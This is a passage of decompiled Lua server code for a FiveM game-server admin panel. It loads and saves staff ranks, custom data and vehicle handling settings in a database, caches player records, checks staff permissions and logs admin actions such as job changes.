  L4_2 = tonumber
  L5_2 = A1_2.gamerTagColor
  L4_2 = L4_2(L5_2)
  if not L4_2 then
    L4_2 = 208
  end
  L5_2 = L34_1.Async
  L5_2 = L5_2.execute
  L6_2 = "INSERT INTO gw_admin_ranks (rank_name, label, rank_color, gamer_tag_color, permissions, players) VALUES (?, ?, ?, ?, ?, ?) "
  L7_2 = "ON DUPLICATE KEY UPDATE label = VALUES(label), rank_color = VALUES(rank_color), gamer_tag_color = VALUES(gamer_tag_color), permissions = VALUES(permissions), players = VALUES(players)"
  L6_2 = L6_2 .. L7_2
  L7_2 = {}
  L8_2 = A0_2
  L9_2 = A1_2.label
  if not L9_2 then
    L9_2 = A0_2
  end
  L10_2 = A1_2.rankColor
  L11_2 = L4_2
  L12_2 = L2_2
  L13_2 = L3_2
  L7_2[1] = L8_2
  L7_2[2] = L9_2
  L7_2[3] = L10_2
  L7_2[4] = L11_2
  L7_2[5] = L12_2
  L7_2[6] = L13_2
  L5_2(L6_2, L7_2)
end
function L58_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2
  if not A0_2 or not A1_2 then
    return
  end
  L2_2 = L53_1
  L3_2 = A0_2
  L4_2 = A1_2
  L2_2(L3_2, L4_2)
end
saveCustomDataEntry = L58_1
function L58_1(A0_2)
  local L1_2, L2_2
  if not A0_2 then
    return
  end
  L1_2 = L54_1
  L2_2 = A0_2
  L1_2(L2_2)
end
deleteCustomDataEntry = L58_1
function L58_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L0_2 = {}
  custom_data = L0_2
  L0_2 = L50_1
  L0_2 = L0_2()
  if not L0_2 then
    return
  end
  L0_2 = L34_1.Sync
  L0_2 = L0_2.fetchAll
  L1_2 = "SELECT uuid, type, data FROM gw_admin_custom_data"
  L0_2 = L0_2(L1_2)
  if L0_2 then
    L1_2 = #L0_2
    if L1_2 > 0 then
      L1_2 = ipairs
      L2_2 = L0_2
      L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2)
      for L5_2, L6_2 in L1_2, L2_2, L3_2, L4_2 do
        L7_2 = tonumber
        L8_2 = L6_2.uuid
        L7_2 = L7_2(L8_2)
        if L7_2 then
          L8_2 = json
          L8_2 = L8_2.decode
          L9_2 = L6_2.data
          if not L9_2 then
            L9_2 = "{}"
          end
          L8_2 = L8_2(L9_2)
          if not L8_2 then
            L8_2 = {}
          end
          L9_2 = L8_2.type
          if not L9_2 then
            L9_2 = L6_2.type
          end
          L8_2.type = L9_2
          L9_2 = L8_2.uuid
          if not L9_2 then
            L9_2 = L7_2
          end
          L8_2.uuid = L9_2
          L9_2 = custom_data
          L9_2[L7_2] = L8_2
        end
      end
      return
    end
  end
end
loadData = L58_1
function L58_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2
  L1_2 = L50_1
  L1_2 = L1_2()
  L2_2 = {}
  L3_2 = pairs
  L4_2 = ranksServer
  L3_2, L4_2, L5_2, L6_2 = L3_2(L4_2)
  for L7_2, L8_2 in L3_2, L4_2, L5_2, L6_2 do
    L9_2 = type
    L10_2 = L8_2
    L9_2 = L9_2(L10_2)
    if "table" == L9_2 then
      L9_2 = L28_1
      L10_2 = L8_2.permissions
      L9_2 = L9_2(L10_2)
      L8_2.permissions = L9_2
      L9_2 = {}
      L10_2 = pairs
      L11_2 = L8_2.permissions
      L10_2, L11_2, L12_2, L13_2 = L10_2(L11_2)
      for L14_2, L15_2 in L10_2, L11_2, L12_2, L13_2 do
        if true == L15_2 then
          L9_2[L14_2] = true
        end
      end
      L8_2.permissions = L9_2
      L10_2 = L8_2.players
      if not L10_2 then
        L10_2 = {}
      end
      L8_2.players = L10_2
      L10_2 = tonumber
      L11_2 = L8_2.gamerTagColor
      L10_2 = L10_2(L11_2)
      if not L10_2 then
        L10_2 = 208
      end
      L8_2.gamerTagColor = L10_2
      L10_2 = #L2_2
      L10_2 = L10_2 + 1
      L2_2[L10_2] = L7_2
      if L1_2 then
        L10_2 = L57_1
        L11_2 = L7_2
        L12_2 = L8_2
        L10_2(L11_2, L12_2)
      end
    end
  end
  if L1_2 then
    L3_2 = #L2_2
    if 0 == L3_2 then
      L3_2 = L34_1.Async
      L3_2 = L3_2.execute
      L4_2 = "DELETE FROM gw_admin_ranks"
      L3_2(L4_2)
    else
      L3_2 = {}
      L4_2 = 1
      L5_2 = #L2_2
      L6_2 = 1
      for L7_2 = L4_2, L5_2, L6_2 do
        L3_2[L7_2] = "?"
      end
      L4_2 = "DELETE FROM gw_admin_ranks WHERE rank_name NOT IN (%s)"
      L5_2 = L4_2
      L4_2 = L4_2.format
      L6_2 = table
      L6_2 = L6_2.concat
      L7_2 = L3_2
      L8_2 = ","
      L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2 = L6_2(L7_2, L8_2)
      L4_2 = L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2)
      L5_2 = L34_1.Async
      L5_2 = L5_2.execute
      L6_2 = L4_2
      L7_2 = L2_2
      L5_2(L6_2, L7_2)
    end
  end
  L3_2 = _G
  L4_2 = ranksServer
  L3_2.ranksServer = L4_2
  L3_2 = GetOnlineStaff
  L3_2 = L3_2()
  L4_2 = ipairs
  L5_2 = L3_2
  L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
  for L8_2, L9_2 in L4_2, L5_2, L6_2, L7_2 do
    L10_2 = TriggerClientEvent
    L11_2 = "updateranklist"
    L12_2 = L9_2
    L13_2 = ranksServer
    L10_2(L11_2, L12_2, L13_2)
  end
  if not A0_2 then
    L4_2 = PlayerServer
    if L4_2 then
      L4_2 = pairs
      L5_2 = PlayerServer
      L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
      for L8_2, L9_2 in L4_2, L5_2, L6_2, L7_2 do
        if L9_2 then
          L10_2 = getPlayersRole
          L11_2 = L8_2
          L10_2 = L10_2(L11_2)
          L9_2.role = L10_2
          L11_2 = getRoleColor
          L12_2 = L10_2
          L11_2 = L11_2(L12_2)
          L9_2.roleColor = L11_2
          L11_2 = getGamerTagColor
          L12_2 = L10_2
          L11_2 = L11_2(L12_2)
          L9_2.gamerTagColor = L11_2
          L11_2 = getRolesPermissions
          L12_2 = L10_2
          L13_2 = L8_2
          L11_2 = L11_2(L12_2, L13_2)
          L9_2.permission = L11_2
        end
      end
    end
  end
end
saveRanks = L58_1
function L58_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L0_2 = {}
  ranksServer = L0_2
  L0_2 = L50_1
  L0_2 = L0_2()
  if not L0_2 then
    return
  end
  L0_2 = L34_1.Sync
  L0_2 = L0_2.fetchAll
  L1_2 = "SELECT rank_name, label, rank_color, gamer_tag_color, permissions, players FROM gw_admin_ranks"
  L0_2 = L0_2(L1_2)
  if L0_2 then
    L1_2 = #L0_2
    if L1_2 > 0 then
      L1_2 = ipairs
      L2_2 = L0_2
      L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2)
      for L5_2, L6_2 in L1_2, L2_2, L3_2, L4_2 do
        L7_2 = json
        L7_2 = L7_2.decode
        L8_2 = L6_2.permissions
        if not L8_2 then
          L8_2 = "{}"
        end
        L7_2 = L7_2(L8_2)
        if not L7_2 then
          L7_2 = {}
        end
        L8_2 = json
        L8_2 = L8_2.decode
        L9_2 = L6_2.players
        if not L9_2 then
          L9_2 = "[]"
        end
        L8_2 = L8_2(L9_2)
        if not L8_2 then
          L8_2 = {}
        end
        L9_2 = ranksServer
        L10_2 = L6_2.rank_name
        L11_2 = {}
        L12_2 = L6_2.label
        if not L12_2 then
          L12_2 = L6_2.rank_name
        end
        L11_2.label = L12_2
        L12_2 = L28_1
        L13_2 = L7_2
        L12_2 = L12_2(L13_2)
        L11_2.permissions = L12_2
        L12_2 = L6_2.rank_color
        L11_2.rankColor = L12_2
        L12_2 = tonumber
        L13_2 = L6_2.gamer_tag_color
        L12_2 = L12_2(L13_2)
        if not L12_2 then
          L12_2 = 208
        end
        L11_2.gamerTagColor = L12_2
        L11_2.players = L8_2
        L9_2[L10_2] = L11_2
      end
      L1_2 = _G
      L2_2 = ranksServer
      L1_2.ranksServer = L2_2
      return
    end
  end
end
loadRanks = L58_1
function L58_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2
  if not A0_2 or not A1_2 then
    return
  end
  L2_2 = L55_1
  L3_2 = A0_2
  L4_2 = A1_2
  L2_2(L3_2, L4_2)
end
saveHandlingEntry = L58_1
function L58_1(A0_2)
  local L1_2, L2_2
  if not A0_2 then
    return
  end
  L1_2 = L56_1
  L2_2 = A0_2
  L1_2(L2_2)
end
deleteHandlingEntry = L58_1
function L58_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L0_2 = {}
  Handling = L0_2
  L0_2 = L50_1
  L0_2 = L0_2()
  if not L0_2 then
    return
  end
  L0_2 = L34_1.Sync
  L0_2 = L0_2.fetchAll
  L1_2 = "SELECT plate, data FROM gw_admin_handling"
  L0_2 = L0_2(L1_2)
  if L0_2 then
    L1_2 = #L0_2
    if L1_2 > 0 then
      L1_2 = ipairs
      L2_2 = L0_2
      L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2)
      for L5_2, L6_2 in L1_2, L2_2, L3_2, L4_2 do
        L7_2 = L6_2.plate
        if L7_2 then
          L7_2 = json
          L7_2 = L7_2.decode
          L8_2 = L6_2.data
          if not L8_2 then
            L8_2 = "{}"
          end
          L7_2 = L7_2(L8_2)
          if not L7_2 then
            L7_2 = {}
          end
          L8_2 = Handling
          L9_2 = L6_2.plate
          L8_2[L9_2] = L7_2
        end
      end
      return
    end
  end
end
loadHandling = L58_1
function L58_1()
  local L0_2, L1_2, L2_2, L3_2
  L0_2 = {}
  serverButtonFunds = L0_2
  function L0_2(A0_3, A1_3)
    local L2_3, L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3, L11_3
    L2_3 = type
    L3_3 = A0_3
    L2_3 = L2_3(L3_3)
    if "table" ~= L2_3 then
      return
    end
    L2_3 = ipairs
    L3_3 = A0_3
    L2_3, L3_3, L4_3, L5_3 = L2_3(L3_3)
    for L6_3, L7_3 in L2_3, L3_3, L4_3, L5_3 do
      L8_3 = table
      L8_3 = L8_3.insert
      L9_3 = serverButtonFunds
      L10_3 = {}
      L11_3 = L7_3.label
      L10_3.label = L11_3
      L11_3 = L7_3.key
      L10_3.key = L11_3
      L10_3.category = A1_3
      L10_3.checked = false
      L8_3(L9_3, L10_3)
    end
  end
  L1_2 = L0_2
  L2_2 = L24_1.menu
  L3_2 = "menu"
  L1_2(L2_2, L3_2)
  L1_2 = L0_2
  L2_2 = L24_1.staff_actions
  L3_2 = "staff"
  L1_2(L2_2, L3_2)
  L1_2 = L0_2
  L2_2 = L24_1.personal_actions
  L3_2 = "personal"
  L1_2(L2_2, L3_2)
end
extraire_labels = L58_1
L23_1 = master
L58_1 = _G
L59_1 = master
L58_1.master = L59_1
L58_1 = _G
L59_1 = ranksServer
L58_1.ranksServer = L59_1
L58_1 = _G
L58_1.masterLicenses = L23_1
L58_1 = extraire_labels
L58_1()
L58_1 = _G
L59_1 = ranksServer
L58_1.ranksServer = L59_1
L58_1 = L34_1.ready
function L59_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2
  L0_2 = L51_1
  L0_2()
  L0_2 = L52_1
  L0_2()
  L0_2 = true
  L1_1 = L0_2
  L0_2 = loadData
  L0_2()
  L0_2 = loadRanks
  L0_2()
  L0_2 = loadHandling
  L0_2()
  L0_2 = _G
  L1_2 = ranksServer
  L0_2.ranksServer = L1_2
  L0_2 = false
  L1_2 = L34_1.Sync
  L1_2 = L1_2.fetchAll
  L2_2 = "SHOW COLUMNS FROM users LIKE 'last_connection'"
  L1_2 = L1_2(L2_2)
  if L1_2 then
    L2_2 = #L1_2
    if 0 ~= L2_2 then
      goto lbl_50
    end
  end
  L2_2 = print
  L3_2 = "[GW-ADMIN] Colonne last_connection introuvable, cr\195\169ation en cours..."
  L2_2(L3_2)
  L2_2 = pcall
  function L3_2()
    local L0_3, L1_3
    L0_3 = L34_1.Sync
    L0_3 = L0_3.execute
    L1_3 = [[
                ALTER TABLE users
                ADD COLUMN last_connection DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            ]]
    L0_3(L1_3)
  end
  L2_2, L3_2 = L2_2(L3_2)
  if L2_2 then
    L4_2 = print
    L5_2 = "[GW-ADMIN] Colonne last_connection cr\195\169\195\169e avec succ\195\168s"
    L4_2(L5_2)
    L0_2 = true
  else
    L4_2 = print
    L5_2 = string
    L5_2 = L5_2.format
    L6_2 = "[GW-ADMIN] Erreur lors de la cr\195\169ation de last_connection: %s"
    L7_2 = tostring
    L8_2 = L3_2
    L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2 = L7_2(L8_2)
    L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2 = L5_2(L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2)
    L4_2(L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2)
    L0_2 = false
    goto lbl_51
    ::lbl_50::
    L0_2 = true
  end
  ::lbl_51::
  L2_2 = nil
  L3_2 = 0
  if L0_2 then
    L4_2 = L34_1.Sync
    L4_2 = L4_2.fetchAll
    L5_2 = "SELECT * FROM users ORDER BY last_connection DESC LIMIT 1000"
    L4_2 = L4_2(L5_2)
    L2_2 = L4_2
  else
    L4_2 = L34_1.Sync
    L4_2 = L4_2.fetchAll
    L5_2 = "SELECT * FROM users LIMIT 1000"
    L4_2 = L4_2(L5_2)
    L2_2 = L4_2
  end
  if L2_2 then
    L4_2 = pairs
    L5_2 = L2_2
    L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
    for L8_2, L9_2 in L4_2, L5_2, L6_2, L7_2 do
      L10_2 = ""
      L11_2 = L9_2.firstname
      if L11_2 then
        L11_2 = L9_2.lastname
        if L11_2 then
          L11_2 = L9_2.firstname
          L12_2 = " "
          L13_2 = L9_2.lastname
          L11_2 = L11_2 .. L12_2 .. L13_2
          L10_2 = L11_2
      end
      else
        L11_2 = L9_2.firstname
        if L11_2 then
          L10_2 = L9_2.firstname
        else
          L11_2 = L9_2.lastname
          if L11_2 then
            L10_2 = L9_2.lastname
          end
        end
      end
      L11_2 = {}
      L12_2 = L9_2.identifier
      if not L12_2 then
        L12_2 = ""
      end
      L11_2.identifier = L12_2
      L11_2.name = L10_2
      L12_2 = L9_2.firstname
      if not L12_2 then
        L12_2 = ""
      end
      L11_2.firstname = L12_2
      L12_2 = L9_2.lastname
      if not L12_2 then
        L12_2 = ""
      end
      L11_2.lastname = L12_2
      L12_2 = L9_2.job
      if not L12_2 then
        L12_2 = ""
      end
      L11_2.job = L12_2
      L12_2 = L9_2.job_grade
      if not L12_2 then
        L12_2 = 0
      end
      L11_2.job_grade = L12_2
      L12_2 = L9_2.role
      if not L12_2 then
        L12_2 = nil
      end
      L11_2.role = L12_2
      L12_2 = L9_2.license
      if not L12_2 then
        L12_2 = L9_2.identifier
        if not L12_2 then
          L12_2 = ""
        end
      end
      L11_2.license = L12_2
      L12_2 = L9_2.discord
      if not L12_2 then
        L12_2 = nil
      end
      L11_2.discord = L12_2
      L12_2 = L9_2.phone_number
      if not L12_2 then
        L12_2 = nil
      end
      L11_2.phone_number = L12_2
      L12_2 = L9_2.position
      if L12_2 then
        L12_2 = json
        L12_2 = L12_2.decode
        L13_2 = L9_2.position
        if not L13_2 then
          L13_2 = "{}"
        end
        L12_2 = L12_2(L13_2)
        if L12_2 then
          goto lbl_159
        end
      end
      L12_2 = {}
      ::lbl_159::
      L11_2.position = L12_2
      L12_2 = PlayerServerOffline
      L13_2 = L9_2.identifier
      L12_2[L13_2] = L11_2
      L3_2 = L3_2 + 1
    end
  end
end
L58_1(L59_1)
function L58_1(A0_2, A1_2, A2_2, A3_2, ...)
  local L4_2, L5_2, L6_2, L7_2, L8_2
  L4_2 = IsStaff
  L5_2 = A0_2
  L4_2 = L4_2(L5_2)
  if not L4_2 then
    L4_2 = DropPlayer
    L5_2 = A0_2
    L6_2 = "You are not allowed to use this resource"
    L4_2(L5_2, L6_2)
    return
  end
  L4_2 = TriggerClientEvent
  L5_2 = A2_2
  L6_2 = A1_2
  L7_2, L8_2 = ...
  L4_2(L5_2, L6_2, L7_2, L8_2)
  L4_2 = TriggerClientEvent
  L5_2 = "gunware:notif"
  L6_2 = A0_2
  L7_2 = "success"
  L8_2 = A3_2
  L4_2(L5_2, L6_2, L7_2, L8_2)
end
function L59_1(A0_2, A1_2, A2_2, A3_2)
  local L4_2, L5_2, L6_2, L7_2, L8_2
  L4_2 = L34_1
  if not L4_2 then
    L4_2 = A3_2.targetPlayerId
    if L4_2 then
      L4_2 = TriggerClientEvent
      L5_2 = "gunware:notif"
      L6_2 = A3_2.targetPlayerId
      L7_2 = "error"
      L8_2 = "Database connection not available."
      L4_2(L5_2, L6_2, L7_2, L8_2)
    end
    return
  end
  L4_2 = L34_1.Async
  L4_2 = L4_2.execute
  L5_2 = A1_2
  L6_2 = A2_2
  function L7_2(A0_3)
    local L1_3, L2_3, L3_3, L4_3, L5_3
    if A0_3 > 0 then
      L1_3 = "Unknown"
      L2_3 = A3_2.targetPlayerId
      if L2_3 then
        L2_3 = GetPlayerName
        L3_3 = A3_2.targetPlayerId
        L2_3 = L2_3(L3_3)
        L1_3 = L2_3 or L1_3
        if not L2_3 then
          L1_3 = "Unknown"
        end
      end
      L2_3 = logAdminAction
      L3_3 = {}
      L4_3 = A3_2.action
      L3_3.action = L4_3
      L3_3.playerName = L1_3
      L4_3 = A3_2.description
      L3_3.description = L4_3
      L3_3.color = 16711680
      L4_3 = A3_2.webhook
      L3_3.webhook = L4_3
      L2_3(L3_3)
    else
      L1_3 = A3_2.targetPlayerId
      if L1_3 then
        L1_3 = TriggerClientEvent
        L2_3 = "gunware:notif"
        L3_3 = A3_2.targetPlayerId
        L4_3 = "error"
        L5_3 = "Failed to update database for player."
        L1_3(L2_3, L3_3, L4_3, L5_3)
      end
    end
  end
  L4_2(L5_2, L6_2, L7_2)
end
function L60_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2
  L3_2 = RegisterNetEvent
  L4_2 = A0_2
  L3_2(L4_2)
  L3_2 = AddEventHandler
  L4_2 = A0_2
  function L5_2(...)
    local L0_3, L1_3, L2_3, L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3
    L0_3 = source
    L1_3 = false
    L2_3 = type
    L3_3 = A2_2
    L2_3 = L2_3(L3_3)
    if "function" == L2_3 then
      L2_3 = A2_2
      L3_3 = L0_3
      L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3 = ...
      L2_3 = L2_3(L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3)
      L1_3 = L2_3
    else
      L2_3 = type
      L3_3 = A2_2
      L2_3 = L2_3(L3_3)
      if "string" == L2_3 then
        L2_3 = L29_1
        L3_3 = L0_3
        L4_3 = A2_2
        L2_3 = L2_3(L3_3, L4_3)
        L1_3 = L2_3
      else
        L2_3 = type
        L3_3 = A2_2
        L2_3 = L2_3(L3_3)
        if "table" == L2_3 then
          L2_3 = ipairs
          L3_3 = A2_2
          L2_3, L3_3, L4_3, L5_3 = L2_3(L3_3)
          for L6_3, L7_3 in L2_3, L3_3, L4_3, L5_3 do
            L8_3 = L29_1
            L9_3 = L0_3
            L10_3 = L7_3
            L8_3 = L8_3(L9_3, L10_3)
            if L8_3 then
              L1_3 = true
              break
            end
          end
        else
          L2_3 = IsStaff
          L1_3 = L2_3 or L1_3
          if L2_3 then
            L2_3 = IsStaff
            L3_3 = L0_3
            L2_3 = L2_3(L3_3)
            L1_3 = L2_3
          end
        end
      end
    end
    if not L1_3 then
      L2_3 = DropPlayer
      L3_3 = L0_3
      L4_3 = "You are not allowed to use this resource."
      L2_3(L3_3, L4_3)
      return
    end
    L2_3 = A1_2
    L3_3 = L0_3
    L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3 = ...
    L2_3(L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3, L10_3)
  end
  L3_2(L4_2, L5_2)
end
function L61_1(A0_2, A1_2, A2_2, A3_2, A4_2, A5_2, ...)
  local L6_2, L7_2, L8_2, L9_2, L10_2
  L6_2 = GetPlayerPed
  L7_2 = A1_2
  L6_2 = L6_2(L7_2)
  if not L6_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:notif"
    L8_2 = A0_2
    L9_2 = "error"
    L10_2 = "Target player not found or offline."
    L6_2(L7_2, L8_2, L9_2, L10_2)
    return
  end
  L6_2 = TriggerClientEvent
  L7_2 = A3_2
  L8_2 = A1_2
  L9_2, L10_2 = ...
  L6_2(L7_2, L8_2, L9_2, L10_2)
  L6_2 = logAdminAction
  L7_2 = {}
  L7_2.action = A2_2
  L8_2 = GetPlayerName
  L9_2 = A1_2
  L8_2 = L8_2(L9_2)
  L7_2.playerName = L8_2
  L7_2.description = A5_2
  L7_2.color = 16711680
  L7_2.webhook = A4_2
  L6_2(L7_2)
end
function L62_1(A0_2, A1_2, A2_2, A3_2, A4_2, A5_2)
  local L6_2, L7_2, L8_2, L9_2, L10_2, L11_2
  L6_2 = L32_1
  if not L6_2 then
    L6_2 = TriggerClientEvent
    L7_2 = "gunware:notif"
    L8_2 = A0_2
    L9_2 = "error"
    L10_2 = "ESX framework not available."
    L6_2(L7_2, L8_2, L9_2, L10_2)
    return
  end
  L6_2 = L32_1.GetPlayerFromId
  L7_2 = A1_2
  L6_2 = L6_2(L7_2)
  if not L6_2 then
    L7_2 = TriggerClientEvent
    L8_2 = "gunware:notif"
    L9_2 = A0_2
    L10_2 = "error"
    L11_2 = "Player not found (ESX data)."
    L7_2(L8_2, L9_2, L10_2, L11_2)
    return
  end
  L7_2 = A5_2
  L8_2 = L6_2
  L7_2(L8_2)
  L7_2 = logAdminAction
  L8_2 = {}
  L8_2.action = A2_2
  L9_2 = GetPlayerName
  L10_2 = A1_2
  L9_2 = L9_2(L10_2)
  L8_2.playerName = L9_2
  L8_2.description = A4_2
  L8_2.color = 16711680
  L8_2.webhook = A3_2
  L7_2(L8_2)
end
L63_1 = RegisterNetEvent
L64_1 = "gunware:sync:actionPlayer"
L63_1(L64_1)
L63_1 = AddEventHandler
L64_1 = "gunware:sync:actionPlayer"
function L65_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2
  L2_2 = source
  L3_2 = type
  L4_2 = A1_2
  L3_2 = L3_2(L4_2)
  if "table" ~= L3_2 then
    L3_2 = {}
    A1_2 = L3_2
  end
  A1_2.action = A0_2
  if A1_2 then
    L3_2 = A1_2.permissionKey
    if L3_2 then
      goto lbl_20
    end
  end
  L3_2 = A1_2.action
  if not L3_2 then
    L3_2 = A0_2
  end
  ::lbl_20::
  if not L3_2 or "" == L3_2 then
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = L2_2
    L7_2 = "error"
    L8_2 = "Cl\195\169 de permission manquante."
    L4_2(L5_2, L6_2, L7_2, L8_2)
    L4_2 = serverSyncLog
    L5_2 = string
    L5_2 = L5_2.format
    L6_2 = "Acc\195\168s refus\195\169 pour %s (ID: %d) - cl\195\169 de permission manquante pour l'action %s"
    L7_2 = GetPlayerName
    L8_2 = L2_2
    L7_2 = L7_2(L8_2)
    if not L7_2 then
      L7_2 = "Unknown"
    end
    L8_2 = L2_2
    L9_2 = A0_2
    L5_2 = L5_2(L6_2, L7_2, L8_2, L9_2)
    L6_2 = "warning"
    L4_2(L5_2, L6_2)
    return
  end
  L4_2 = L29_1
  L5_2 = L2_2
  L6_2 = L3_2
  L4_2 = L4_2(L5_2, L6_2)
  if not L4_2 then
    L4_2 = TriggerClientEvent
    L5_2 = "gunware:notif"
    L6_2 = L2_2
    L7_2 = "error"
    L8_2 = "Vous n'avez pas la permission pour cette action."
    L4_2(L5_2, L6_2, L7_2, L8_2)
    L4_2 = serverSyncLog
    L5_2 = string
    L5_2 = L5_2.format
    L6_2 = "Acc\195\168s refus\195\169 pour %s (ID: %d) sur l'action %s"
    L7_2 = GetPlayerName
    L8_2 = L2_2
    L7_2 = L7_2(L8_2)
    if not L7_2 then
      L7_2 = "Unknown"
    end
    L8_2 = L2_2
    L9_2 = L3_2
    L5_2 = L5_2(L6_2, L7_2, L8_2, L9_2)
    L6_2 = "warning"
    L4_2(L5_2, L6_2)
    L4_2 = logAdminAction
    L5_2 = {}
    L5_2.action = "Unauthorized Access Attempt"
    L6_2 = GetPlayerName
    L7_2 = L2_2
    L6_2 = L6_2(L7_2)
    if not L6_2 then
      L6_2 = "Unknown"
    end
    L5_2.playerName = L6_2
    L5_2.source = L2_2
    L6_2 = string
    L6_2 = L6_2.format
    L7_2 = "Tentative d'acc\195\168s non autoris\195\169 \195\160 l'action: %s"
    L8_2 = L3_2
    L6_2 = L6_2(L7_2, L8_2)
    L5_2.description = L6_2
    L5_2.webhook = "unauthorized_access"
    L5_2.reason = L3_2
    L5_2.color = 16711680
    L4_2(L5_2)
    return
  end
  L4_2 = A1_2.target
  if -1 ~= L4_2 then
    L4_2 = GetPlayerPed
    L5_2 = A1_2.target
    L4_2 = L4_2(L5_2)
    if not L4_2 then
      L4_2 = TriggerClientEvent
      L5_2 = "gunware:notif"
      L6_2 = L2_2
      L7_2 = "error"
      L8_2 = "Target player not found."
      L4_2(L5_2, L6_2, L7_2, L8_2)
      return
    end
  end
  L4_2 = A1_2.action
  if "player_setJob" == L4_2 then
    L4_2 = L31_1
    if L4_2 then
      L4_2 = L31_1.setJob
      if L4_2 then
        L4_2 = L31_1.setJob
        L5_2 = A1_2.target
        L6_2 = A1_2.job
        L7_2 = A1_2.grade
        L4_2 = L4_2(L5_2, L6_2, L7_2)
        if L4_2 then
          L5_2 = TriggerClientEvent
          L6_2 = "gunware:notif"
          L7_2 = L2_2
          L8_2 = "success"
          L9_2 = "Job chang\195\169 avec succ\195\168s vers "
          L10_2 = A1_2.job
          L11_2 = " grade "
          L12_2 = A1_2.grade
          L9_2 = L9_2 .. L10_2 .. L11_2 .. L12_2
          L5_2(L6_2, L7_2, L8_2, L9_2)
          L5_2 = logAdminAction
          L6_2 = {}
          L6_2.action = "Set Job"
          L7_2 = GetPlayerName
          L8_2 = L2_2
          L7_2 = L7_2(L8_2)
          L6_2.playerName = L7_2
          L7_2 = GetPlayerName
          L8_2 = A1_2.target
          L7_2 = L7_2(L8_2)
          L6_2.targetName = L7_2
          L6_2.source = L2_2
          L7_2 = A1_2.target
          L6_2.targetPlayerId = L7_2
          L7_2 = string
          L7_2 = L7_2.format
          L8_2 = "Job chang\195\169 pour %s vers %s (grade %s)"
          L9_2 = GetPlayerName
          L10_2 = A1_2.target
          L9_2 = L9_2(L10_2)
          L10_2 = A1_2.job
          L11_2 = A1_2.grade
          L7_2 = L7_2(L8_2, L9_2, L10_2, L11_2)
          L6_2.description = L7_2
          L6_2.webhook = "setjob"
          L7_2 = A1_2.job
          L6_2.job = L7_2
          L7_2 = A1_2.grade
          L6_2.grade = L7_2
          L6_2.color = 3447003
          L5_2(L6_2)
        else
          L5_2 = TriggerClientEvent
          L6_2 = "gunware:notif"
          L7_2 = L2_2
          L8_2 = "error"
          L9_2 = "Erreur lors du changement de job"
          L5_2(L6_2, L7_2, L8_2, L9_2)
          L5_2 = logAdminAction
          L6_2 = {}
          L6_2.action = "Set Job - \195\137chec"
          L7_2 = GetPlayerName
          L8_2 = L2_2
          L7_2 = L7_2(L8_2)
          L6_2.playerName = L7_2
          L7_2 = GetPlayerName
          L8_2 = A1_2.target
          L7_2 = L7_2(L8_2)
          L6_2.targetName = L7_2
          L6_2.source = L2_2
          L7_2 = A1_2.target
          L6_2.targetPlayerId = L7_2
          L7_2 = string
          L7_2 = L7_2.format
          L8_2 = "\195\137chec du changement de job pour %s"
          L9_2 = GetPlayerName
          L10_2 = A1_2.target
          L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2 = L9_2(L10_2)
          L7_2 = L7_2(L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2)
          L6_2.description = L7_2
          L6_2.webhook = "error_framework"
          L6_2.color = 16711680
          L5_2(L6_2)
        end
    end
    else
      L4_2 = TriggerClientEvent
      L5_2 = "gunware:notif"
      L6_2 = L2_2
      L7_2 = "error"
      L8_2 = "Fonction SetJob non disponible - v\195\169rifiez ESX/QBCore"
      L4_2(L5_2, L6_2, L7_2, L8_2)
      L4_2 = logAdminAction
      L5_2 = {}
      L5_2.action = "Set Job - Framework non disponible"
      L6_2 = GetPlayerName
      L7_2 = L2_2
      L6_2 = L6_2(L7_2)
      L5_2.playerName = L6_2
      L5_2.source = L2_2
      L5_2.description = "Tentative de changement de job mais le framework n'est pas disponible"
      L5_2.webhook = "error_framework"
      L5_2.color = 16711680
      L4_2(L5_2)
    end
    return
  else
    L4_2 = A1_2.action
    if "player_enterInstance" == L4_2 then
